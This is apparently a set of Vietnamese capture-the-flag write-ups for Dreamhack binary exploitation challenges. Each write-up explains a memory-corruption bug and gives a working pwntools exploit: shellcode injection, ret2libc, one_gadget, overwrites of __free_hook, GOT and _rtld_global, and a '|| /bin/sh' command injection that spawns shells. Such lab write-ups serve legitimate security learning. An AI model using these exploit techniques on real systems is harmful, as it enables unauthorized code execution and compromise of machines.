<details>
<details>
<summary>memory_leakage </summary>
	
- Bài cho ta 1 file source và 1 file binary
- Đầu tiên mở source lên thì thấy name khai báo 16 byte mà khúc dưới nhập tên đủ 16 byte luôn. Do đó sẽ thiếu byte để encode null terminator => lỗi off by one. Ngoài ra cũng có biến age 4 byte do kiểu int
![](https://i.imgur.com/yWNAPgl.png)

![](https://i.imgur.com/FgHs49X.png)

- Ở khúc dưới sẽ có chỗ cho ta in tên và tuổi. Vậy ta sẽ debug xem thử thứ tự các biến thế nào để coi leak được hay không

![](https://i.imgur.com/V6GQUJp.png)

- Debug thì thấy thứ tự các biến là name -> age -> flag. Do đó ta chỉ cần cho biến age là số nào đó đủ 4 byte nào đó khác byte /x00 là lấy được flag

- Tiếp theo kết nối với server. Đầu tiên nhập 3 để load flag. Tiếp theo chọn 1 rồi nhập tên đủ 16 byte, name đủ 4 byte khác byte /x00. Cuối cùng nhập 2 để leak.

![](https://i.imgur.com/ZxSGGMB.png)

</details>

<details>
<summary>rtld </summary>
- Đề cho ta file source, file libc và file binary
- Đầu tiên mở file source lên xem thử. Có hàm `get_shell` cho ta shell, ngoài ra hàm `main` leak cho ta libc và cho ta điều khiển dữ liệu của 1 địa chỉ bất kỳ.

![](https://i.imgur.com/skHYxHk.png)

- Tiếp theo ta checksec. Ta thấy PIE enable nên hàm `get_shell` coi như phế vì không leak được. Do đó ở đây ta sẽ sài `one_gadget`

![](https://i.imgur.com/i4KHhC9.png)

- Đề leak cho ta libc vì vậy ta cần overwrite 1 địa chỉ nào đó ở libc mà chương trình có call tới thành `one_gadget`. Đề không leak exe để tính basse nên ở đây khó overwrite `.got.plt`
    
- Do đó ở đây mình cần overwrite địa chỉ libc ở chỗ mình tô vàng. Ở đây theo dreamhack thì mình cần overwrite `_rtld_global`. Đây chính là địa chỉ khi chương trình exit sẽ gọi tới.
![](https://i.imgur.com/KMu39eS.png)

-Tiếp theo mình gdb để tính offset thử.

![](https://i.imgur.com/7j34x4f.png)

- Tiếp theo sài `one_gadget`. Ở đây có địa chỉ cuối mình sài được

![](https://i.imgur.com/L0p36Ds.png)

- Cuối cùng viết script:
```python
from pwn import *
exe = ELF("rtld_patched")
libc = ELF("libc.so.6")
p = remote("host2.dreamhack.games",21781)
#p = process(exe.path)
p.recvuntil(b'stdout: ')
leak =int(p.recvline()[:-1] ,16)
libc.address = leak - 3954208
rtld = libc.address + 6229832
print(hex(libc.address))
print(hex(rtld))
p.sendlineafter(b'addr: ',str(rtld).encode() )
p.sendlineafter(b'value: ',str(libc.address + 0xf1147).encode())
p.interactive()
```
- Chạy thử và ta có flag.
</details>

<details>
<summary>seccomp </summary>
	
- Bài cho ta file source và file binary
- Đầu tiên mở source lên đọc. Tóm tắt thì bài cho ta nhập shellcode để thực thi nhưng sẽ giới hạn không cho ta syscall. Ngoài ra chương trình còn cho ta overwrite 1 địa chỉ bất kỳ.

![](https://i.imgur.com/try1jjo.png)

- Ta lên hàm syscall_filter để đọc thử
    
![](https://i.imgur.com/vXU0sVo.png)

- Ở đây mặc định chương trình sẽ set seccomp mặc định là `SECCOMP_MODE_STRICT`. Mode này chỉ cho phép syscall các hàm sau :  `read`, `write`, `_exit`.
- Ta phân tích tiếp filter của chương trình: Nó chỉ check xem nếu shellcode đang thực hiện có phải của architecture x86-64 hay không, nếu phải thì lấy syscall number, không phải thì terminate bằng sigsegv.
- Tiếp theo ta `checksec`.
![](https://i.imgur.com/pW9sQm7.png)

- Ta thấy PIE disable, mà chương trình mặc định sẽ gọi `SECCOMP_MODE_STRICT`, do đó ta tìm cách overwrite `mode` thành `SECCOMP_MOD`E nào đó mà "nhẹ hơn".
- Đọc doc của linux kernel thì thấy có 2 mode mà ta có thể sài là 0 và 2. 0 tức disable luôn còn 2 là sài cái filter ở trên mình phân tích. Mà cái filter đó không có gì nguy hiểm tới shellcode của mình hết nên mình thích overwrite mode bằng 0 hay 2 là tuỳ. Ở đây mình overwrite thành 2

![](https://i.imgur.com/in6Xdk3.png)

- Tiếp theo ida tìm địa chỉ của `mode`. Ta được địa chỉ là `0x0000000000602090` tức `6299792`
![](https://i.imgur.com/WF8Of4v.png)

- Cuối cùng viết script. Đầu tiên ta overwrite `mode` thành 2, sau đó nhập shellcode cuối cùng thực thi 
```python
from pwn import *
exe = ELF("seccomp")
#p=remote("host3.dreamhack.games",21718)
p = process(exe.path)

context.update(arch='amd64',os='linux')
shell = shellcraft.sh()

p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'addr: ',b'6299792')
p.sendlineafter(b'value: ',b'2')

p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'shellcode: ',asm(shell))

p.sendlineafter(b'> ',b'2')
p.interactive()
```
</details>
	
<summary>Welcome </summary>
	
- Ta chỉ cần kết nối và lấy flag
    
![](https://i.imgur.com/iDQVZs4.png)

</details>

<details>
<summary>basic_exploitation_000 </summary>
	
- Đề cho ta một file source và 1 file binary
- Đầu tiên mở source xem thì thấy bị lỗi buffer overflow ở `scanf`
    
![](https://i.imgur.com/n5GB0GC.png)

- Do tắt hết các chế độ bảo vệ và trong code không có chỗ nào để lấy flag nên ta sẽ làm theo dạng ret2shell code
    
![](https://i.imgur.com/YEmF9r9.png)
    
- `scanf` không thể đọc các byte `\x09, \x0a, \x0b, \x0c, \x0d, \x20` do đó cần chọn shell cẩn thận

- Đây là shell tìm được
    
![](https://i.imgur.com/6JHxzSU.png)

- Kế tiếp ta tìm padding để overwrite ret address. Nếu tìm đúng thì ta được code như sau:
```python
from pwn import *
p = remote("host3.dreamhack.games",19166)
#p = process("./basic_exploitation_000")
p.recvuntil(b'(')
leak = int(p.recv(10).decode(),16)
print(hex(leak))
shell = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x08\xfe\xc0\xfe\xc0\xfe\xc0\xcd\x80"
payload = shell
payload += payload.rjust(132-len(shell), b"\x90") +  p32(leak)
p.sendlineafter(b")\n", payload)
p.interactive()
```
- Chạy script trên ta sẽ có được shell

</details>

<details>
<summary>basic_exploitation_001 </summary>
	
- Đề cho ta một file source và 1 file binary

![](https://i.imgur.com/YK5Xv37.png)

- Nhìn code thì mục đích ta là lợi dụng buffer overflow để chuyển ret qua `read_flag`
    
- Do đó ta cần tìm padding rồi overwrite ret address

- Script : 
```python
from pwn import *
exe = ELF("./basic_exploitation_001")
p= remote("host3.dreamhack.games", 1576)
#p= process(exe.path)
payload = b'A'*132 + p32(exe.sym['read_flag'])
p.sendline(payload)
p.interactive()
```
- Chạy script trên ta sẽ có được flag
</details>

<details>
<summary>shell_basic </summary>
	
- Đề cho ta một file source và 1 file binary
    
- Đọc code thì thấy chương trình sẽ chạy shellcode của ta nhập vào, và nó muốn ta viết asm để write, read, không sài `execve`

![](https://i.imgur.com/gtb4Dui.png)

- Đề cho ta sẵn tên flag và trong pwntool có sẵn thư viện để cat luôn nên sài cho nhanh
    
![](https://i.imgur.com/liAisvR.png)
    
- Script: 
```python
from pwn import *
context.arch='amd64'
p=remote("host1.dreamhack.games",15482)
p.sendafter(":",asm(shellcraft.cat("/home/shell_basic/flag_name_is_loooooong")))
p.interactive()
```

- Chạy script trên ta sẽ có được flag
</details>

<details>
<summary>Return Address Overwrite </summary>
	
- Đề cho ta một file source và 1 file binary
- Đọc code thì ta cần buffer overflow ở `scanf` để ret qua `get_shell`
    
![](https://i.imgur.com/FoP72KD.png)
    
- checksec thì thấy canary tắt nên bài này tìm padding overwrite bình thường là ra

![](https://i.imgur.com/N6HDEQj.png)

- Do mấy bài này dạng cơ bản nên mình không phân tích chi tiết

- Script : 
```python=
from pwn import *
exe = ELF("./rao")
p = remote("host3.dreamhack.games", 12411)
payload = b'A'*56 + p64(exe.sym['get_shell'])
p.sendlineafter(b"Input: ", payload)
p.interactive()
```
- Chạy script trên ta sẽ lấy được shell
</details>

<details>
<summary>basic_exploitation_003 </summary>
	
- Đề cho ta một file source và 1 file binary
- Đọc code thì nhận thấy có hàm `sprintf` bị lỗi format string. Hàm này copy `heap_buf` vào `stack_buf` , do trong hàm này không check có format specifier nào không nên bị lỗi này.
    
![](https://i.imgur.com/ZUdyNFB.png)

- Bài này ta có thể lợi dụng fmt để buffer overflow stack_buf hoặc sài fmt ghi địa chỉ nào đó luôn. Ở đây mình sài cách đầu tiên để overwrite ret address của main.
    
![](https://i.imgur.com/QYR5ZTb.png)

- Trừ 2 giá trị tô đỏ trên ta được offset là 256

- Script:
```python
from pwn import *

exe = ELF("basic_exploitation_003")
#p = remote("host2.dreamhack.games",13411)
p = process(exe.path)
p.sendline(b'%156c'+p32(exe.sym['get_shell']))
p.interactive()
```

</details>

<details>
<summary>out_of_bound </summary>
	
- Đề cho ta một file source và 1 file binary
    
![](https://i.imgur.com/1a2kgkJ.png)

- Nhận thấy chương trình không check bound của idx nên sẽ bị lỗi out of bound cho ta thực hiện câu lệnh bất kỳ ở hàm `system`

- Ngoài ra đề cũng kêu nhập tên. Do đó mục đích ta là làm system gọi tới địa trỉ trỏ tới string `/bin/sh`. Ta sẽ làm bằng cách lợi dụng nhập tên ở name

- Do đó ta cần làm command trỏ tới name bằng cách tính offset của id: `0x0804A0AC = 4*id + 0x0804A060`. Ta được id là 19.

![](https://i.imgur.com/eGCzO2q.png)


- Phân tích ta nhận thấy khi trỏ tới name ta cần input thêm một địa chỉ trỏ tới chuỗi `/bin/sh` rồi mới tới `/bin/sh`

- Script:
```python
from pwn import *
p=remote("host3.dreamhack.games",9645)
#p =process("./out_of_bound")
payload = p32(0x0804A0AC+8)+b'\x00'*4+b'/bin/sh\x00'
p.sendafter(b'Admin name: ',payload)
p.sendafter(b'What do you want?: ',b'19')
p.interactive()
```
- Chạy script trên ta sẽ có được shell
</details>

<details>
<summary>Return to Shellcode </summary>
	
- Đề cho ta một file source và 1 file binary
    
![](https://i.imgur.com/xUqhvgK.png)

- Đọc code thì thấy có thể sẽ leak canary và bị lỗi ở buffer overflow ở hàm `gets` 

- Checksec thì nhận thấy `NX disable` và đây là file x64 nên ta giải theo ret2shellcode x64
    
![](https://i.imgur.com/MWLEtJY.png)

- Đầu tiên là leak canary, ta sẽ lợi dụng buffer overflow rồi tìm padding tới canary leak. Do canary có byte 00 đầu làm ảnh hưởng tới printf nên ta sẽ leak lố qua 1 byte

![](https://i.imgur.com/K9pMdma.png)

- Ta sẽ tìm được offset là 0x61 byte. Vậy thì đầu tiên ta sẽ leak ra canary rồi sau đó overwrite ret của `main` qua address `buf` để thực hiện shellcode

- Script : 
```python
from pwn import *
p = process("./r2s")
context.arch = "amd64"
p.recvuntil("buf: ")
buf = int(p.recvline()[:-1], 16)
p.recvuntil("$rbp: ")
buflen = int(p.recvline().split()[0])
buf_cana = buflen - 8

payload = b"A"*(buf_cana + 1)
p.sendafter("Input:", payload)
p.recvuntil(payload)
leak = u64(b"\x00"+p.recvn(7))

shell = asm(shellcraft.sh())
payload = shell.ljust(buf_cana, b"A") + p64(leak) + b"A"*0x8 + p64(buf)

p.sendlineafter("Input:", payload)
p.interactive()
```
</details>

<details>
<summary>basic_rop_x86 </summary>
	
- Đề cho ta 1 file source và file binary

![](https://i.imgur.com/EGKSycy.png)

- Đọc code thì nhận thấy có lỗi buffer overflow ở hàm `read`
    
- Tiếp theo ta `checksec` thì thấy dựa vào tên bài và lỗi này thì chắc chắn ret2libc x86 =)) 

![](https://i.imgur.com/1iyqyyC.png)

- Vậy thì lần đầu ta sẽ leak libc -> quay lại main -> overwrite ret main thành `system('/bin/sh')`

- Để leak libc ta overwrite ret của main theo padding sau để theo calling convention của x86 :`padding + đc plt put + ret main + đc got cần leak` (do arguments push lên stack nên không cần kiếm rop pop rdi...)

- Sau khi có libc ta làm tương tự payload sau để lấy shell: `padding + đc system + gì cũng được + đc binsh`
    
- Script : 
```python
from pwn import *
exe = ELF("basic_rop_x86_patched")
libc = ELF("libc.so.6")
p = remote("host3.dreamhack.games",16434)

payload = b'a'*72 + p32(exe.plt['puts']) + p32(exe.sym['main'])+ p32(exe.got['read'])
p.send(payload)

p.recvuntil(b'a'*64)
read_leak = u32(p.recv(4))
print("leak read : ",hex(read_leak))

libc.address = read_leak-869200
#binsh = libc.address + 1806581
binsh = next(libc.search(b"/bin/sh"))
payload = b'a'*72 + p32(libc.sym['system']) + p32(binsh)+ p32(binsh)
p.send(payload)
p.interactive()
```
</details>

<details>
<summary>basic_rop_x64 </summary>
	
- Bài cho ta 1 file source và 1 file binary
    
![](https://i.imgur.com/QYZZRyB.png)

- Code với checksec y chang phần trước ngoại trừ đây là file x64 thôi.
- Do đó ta làm theo dạng ret2libc x64
- Dạng này thì leak libc -> về `main` -> thực thi `system` y chang phần trước ngoại trừ ta cần kiếm `pop rdi ret` gadget và thích thì kiếm `one_gadget` để lấy shell cho nhanh.
- Script : 
```python
from pwn import *
exe = ELF("basic_rop_x64_patched")
libc = ELF("libc.so.6")
p = remote("host3.dreamhack.games",18845)
pop_rdi = 0x400883
payload = b'A' * 72 + p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.plt['puts']) +  p64(exe.sym['main'])
p.sendline(payload)

p.recvuntil(b'A' * 64)
leak_libc = u64(p.recvline(keepends=False) + b"\x00\x00")
log.info("leak libc: " + hex(leak_libc))

libc.address = leak_libc - 456336

payload = b'A'* 72 + p64(libc.address + 0x45216)
p.sendline(payload)
p.interactive()
```
</details>

<details>
<summary>sint </summary>
	
- Bài cho ta 1 file source và 1 file binary
    
![](https://i.imgur.com/MT2hly4.png)

- Đọc code thì thấy `size` phải trong khoảng [0,256], sau đó sẽ nhập `size-1` số vào `buf`

- Đọc manpage `read` thì nhận thấy `size-1` đó phải là số dương mà nếu ta nhập 0 sẽ dẫn đến `size-1<0` làm read nhận dạng số âm thành số dương. Do đó có lỗi bufer overflow ở `read` nếu ta nhập 0
                                                                                                     
![](https://i.imgur.com/GRBZ6j3.png)

- Ngoài ra chương trình cũng có hàm `get_shell` để lấy shell. Do đó ta cần buffer overflow để ret2get_shell 
                                                                                                       - Script:
```python=
from pwn import *
exe = ELF("sint")
p = remote("host3.dreamhack.games",12276)
#p = process(exe.path)
p.sendlineafter(b'Size: ',b'0')
p.sendlineafter(b'Data: ',b'a'*260+p32(exe.sym['get_shell']))
p.interactive()
```    
</details>

<details>
<summary>Return to Library</summary>
	
- Bài cho ta 1 file source và 1 file binary
    
- Đọc code thì thấy ta cần leak canary rồi overwrite ret address do có lỗi buffer overflow

![](https://i.imgur.com/4rmzscx.png)

- Đọc thì bài này là bài kết hợp ret2libc x64 với ret2shellcode ở trên.

- Ở đây ta không cần leak libc vì No PIE

![](https://i.imgur.com/90ushGF.png)

- Dạng cơ bản nên làm `pop rdi, ret` bình thường thôi. Mà ở đây mình chain thêm ret vì lúc đầu bị lỗi xmm

- Script : 
```python
p.sendafter('Buf: ',payload)
p.recvn(61)
canary = u64(p.recvn(8)) - 0x41

pop_rdi = 0x00400853
ret = 0x400285
binsh = 0x600874
system = 0x4005d0
payload = 'A'*0x38 + p64(canary) + 'A'*0x8
payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.send(payload)
p.interactive()
```
</details>
    
<details>
<summary>one_shot </summary>
	
- Bài cho ta một file binary, 1 file source, 1 file libc

- Đọc file source thì thấy đề sẽ leak libc và bị lỗi buffer overflow ở `read` 

![](https://i.imgur.com/6futpAZ.png)

- Bài không có canary nên overflow bình thường. Ngoài ra code không có chỗ để leak nên bài này ta làm ret2libc.
![](https://i.imgur.com/qTICEDD.png)

- Đề cho overflow 46 byte mà nếu tính padding + chain `pop rdi` sẽ không đủ do đó bài này muốn ta sài `one_gadget`

- Sài `one_gadget` ta được như sau:

![](https://i.imgur.com/EEjsqdh.png)

- Rồi thì ret2libc bình thường thôi.
- Script:

```python
from pwn import *
exe = ELF("oneshot_patched")
libc= ELF("libc.so.6")
#p = process(exe.path)
p= remote("host3.dreamhack.games",20854)
p.recvuntil(b'stdout: ')
std = int(p.recvline(keepends=False).decode(), 16)
libc.address = std - 3954208
payload = b'A'*24 + p64(0) + b'A'*8 + p64(libc.address+0x45216)
p.sendlineafter(b'MSG: ',payload)
p.interactive()
```
</details>
    
<details>
<summary>off_by_one_001 </summary>
	
- Đề cho ta 1 file source và 1 file binary    

- Đọc code thì thấy nếu ta làm cho `age = 0` thì có shell

![](https://i.imgur.com/sMZUFaw.png)

- Đọc hàm `read_str` thì thấy nếu ta nhập đủ 20 ký tự thì sẽ gán index thứ 20 là `\0`. Nhưng thực tế thì `ptr` khai báo là [20] tức từ index 0 ->19. Nên ở đây có lỗi off by one và vô tình ghi vào age và có shell
    
![](https://i.imgur.com/qLTMUax.png)

- Nhập thử và được shell:
    
![](https://i.imgur.com/4E8t67A.png)

</details>
    
<details>
<summary>hook </summary>
	
- Bài cho ta 1 file source, file binary và file libc.    

- Đọc source thì thấy chỗ `*(long *)*ptr = *(ptr+1);` rất đáng ngờ vì nó cho phép ta ghi. Giả sử ta có mảng a[2]={1,2} thì phép toán trên trên tương tự gán a[0]=a[1]. 

![](https://i.imgur.com/BRTXl9y.png)

- Do đó ta cần chọn địa chỉ cần ghi và ở đây là `free`. Ta muốn ghi `free` thành `one_gadget` để lấy shell. 
- Đề leak sẵn cho ta libc, one_gadget thì ta chọn từng cái, cái nào được thì sài.
    
![](https://i.imgur.com/VQL4Gb1.png)

- Chỗ `size` ta nhập số bất kỳ miễn sau đủ lớn để chứa 2 địa chỉ. Còn `data` thì ta input payload để gán địa chỉ `hook` thành địa chỉ `one_gadget`
- Script : 
```python
from pwn import *
exe = ELF("hook_patched")
libc = ELF("libc.so.6")
#p = process(exe.path)
p = remote("host3.dreamhack.games",9920)
p.recvuntil("stdout: ")
stdout = int(p.recvline()[:-1], 16)
libc.address = stdout - 3954208
print(hex(libc.symbols["__free_hook"]))
p.sendlineafter(b'Size: ',b'100')
payload = p64(libc.symbols["__free_hook"]) + p64(libc.address+ 0x4526a)
p.sendlineafter(b'Data: ',payload)
p.interactive()
```

- Ở đây ta sài `__free_hook` vì nó chứa địa chỉ thực thi của `hook` 
- Chạy script trên ta sẽ có shell
</details>

<details>
<summary>rop </summary>
	
- Đề cho ta file source, file libc,file docker,file binary

- Đầu tiên ta đọc source thì thấy cũng giống mấy bài rop trên thôi =)). Bắt leak canary rồi ret2libc

![](https://i.imgur.com/VZBcygu.png)

- Vậy thì ta làm y chang bài trên là được.
- Script : 
```python
from pwn import *

exe=ELF("rop_patched")
libc = ELF("libc.so.6")

#p=process(exe.path)
p = remote("host3.dreamhack.games",17896)

'''
gdb.attach(p,
"""
b*main
c
""")
input()
'''
buf = b"A"*0x39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))

pop_rdi_ret = 0x00000000004007f3
payload = b'A'*56 + p64(cnry)+ b'A'*8
payload += p64(pop_rdi_ret) + p64(exe.got['read']) + p64(exe.plt['puts']) + p64(exe.sym['main'])

p.sendafter("Buf: ",payload)

leak = u64(p.recvn(6)+b'\x00\x00')
print(hex(leak))
libc.address =  leak - libc.sym['read']
print("libc base : ",hex(libc.address))
print("libc system " ,hex(libc.sym['system']))

p.sendafter("Buf: ",b'a')

payload = b'A'*56 + p64(cnry)+ b'A'*8
payload += p64(0x000000000040055e) + p64(pop_rdi_ret) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
p.sendafter("Buf: ",payload)
p.interactive()
```
</details>

<details>
<summary>off_by_one_000</summary>
	
- Đề cho ta 1 file source và 1 file binary
- Đọc file source thì thấy có lỗi off by one ở hàm `strcpy` do biến `cp_name` max là 256 ký tự (bao gồm null byte), khi ta input max 256 ký tự thì sẽ overwrite 1 byte qua `real_name`. Ngoài ra có hàm `get_shell` cho ta shell
- Để coi sự ảnh hưởng của 1 byte null đó ta sẽ debug.
    
![](https://i.imgur.com/7YBUhDZ.png)

- Ở đây trước và sau nhận thấy byte cuối của epb bị overwrite thành 00
- Khi ret address của main lúc này thành `0xffffd004` trỏ về đâu đó giữa chuỗi mình nhập vào
    
![](https://i.imgur.com/TzxgygT.png)

- Do đó khi bị off by one nó sẽ trỏ về giữa stack
    
![](https://i.imgur.com/qpkzABd.png)

- offset là 20 chia hết cho 4 vậy thì đỡ tính toán ta gửi payload là địa chỉ của get_shell (256/4) lần (do địa chỉ get_shell gồm 4 số).
- Script : 
```python
from pwn import *
exe = ELF("off_by_one_000")
p = remote("host3.dreamhack.games",15154)
#p = process(exe.path)
p.sendafter(b'Name: ',p32(exe.sym['get_shell'])*64)
p.interactive()
```
</details>
    
<details>
<summary>cmd_center </summary>
	
- Bài cho ta 1 file binary và 1 file source
    
- Đọc source thì thấy có lỗi buffer overflow ở `read`
![](https://i.imgur.com/D1zAKwq.png)

- Phân tích thì hàm `strncmp` so sánh `cmd_ip` với `ipconfig`. Hàm `strncmp` sẽ so sánh đến khi 1 trong 2 gặp null terminator hoặc sâu cmd_ip khác với `ipconfig` 8 chữ cái đầu. Do đó ta sẽ lợi dụng buffer overflow để overwrite `cmd_ip` thành sâu gồm `ipconfig` + lệnh để lấy shell.
- Script: 
```python
from pwn import *
p = remote("host3.dreamhack.games",15401)
#p = process("./cmd_center")
payload = b'A'*32+b'ifconfig || /bin/sh\x00'
p.sendafter(b'Center name: ',payload)
p.interactive()
```
</details>

<details>
<summary>ssp_000 </summary>
	
- Bài cho ta 1 file binary và 1 file source
    
- Đọc source thì thấy có lỗi buffer overflow và code cho ta gán địa chỉ bất kỳ. Còn có hàm `get_shell` cho ta shell
    
![](https://i.imgur.com/AgJK0xU.png)

- Checksec thì thấy canary bật , NO PIE
    
![](https://i.imgur.com/lPS5Btj.png)


- Phân tích thì nếu bị buffer overflow canary thì code sẽ gọi `stack_chk_fail`. Do đó nếu ta lợi dụng bof để gọi `stack_chk_fail` và dùng lỗi ghi địa chỉ kia để overwrite got `stack_chk_fail` thành `get_shell` thì ta sẽ có được shell
- Script : 
```python
from pwn import *
exe = ELF("ssp_000")
p= remote("host2.dreamhack.games",8718)
#p=process(exe.path)
p.sendline(b'a'*0x80)
p.sendlineafter(b'Addr : ',str(exe.got['__stack_chk_fail']))
p.sendlineafter(b'Value : ',str(exe.sym['get_shell']))
p.interactive()
```
</details>

<details>
<summary>fho </summary>
	
- Đề cho ta 1 file source, file binary,file libc
    
- Đọc code thì thấy có lỗi bof cho ta leak stack,ngoài ra còn có phép gán địa chỉ bất kỳ.
    
![](https://i.imgur.com/uA4un6V.png)

- Checksec thì thấy full giáp
    
![](https://i.imgur.com/9osTwMz.png)

- Ý tưởng hiện tại là leak libc -> write `free` thành `system` -> nhập add là đc `/bin/sh` để lấy shell
- Đầu tiên là leak libc. Ở đây mình sẽ leak `__libc_start_call_main`. Các bước để leak thì làm như bình thường.

![](https://i.imgur.com/H5UEpm5.png)

- Leak xong thì overwrite `free` thành `system`. Để overwrite `free` thì ta cần ghi vào địa chỉ của `__free_hook` vì ở đây chứa địa chỉ thực thi của `free`. Cuối cùng thì lấy ``/bin/sh trong libc.
- Script:
```python
from pwn import *
exe = ELF("fho_patched")
libc= ELF("libc.so.6")
#p=process(exe.path)
p=remote("host3.dreamhack.games",14797)
p.sendlineafter(b'Buf: ',b'a'*72)
p.recvuntil(b'a'*72)
leak = u64(p.recv(6) + b'\x00\x00')
libc.address = leak - 137994
print(hex(libc.address))
p.sendlineafter(b'To write: ', str(libc.sym['__free_hook']))
p.sendlineafter(b'With: ', str(libc.sym['system']))
p.sendlineafter(b'To free: ', str(next(libc.search(b'/bin/sh'))))
p.interactive()
```
</details>
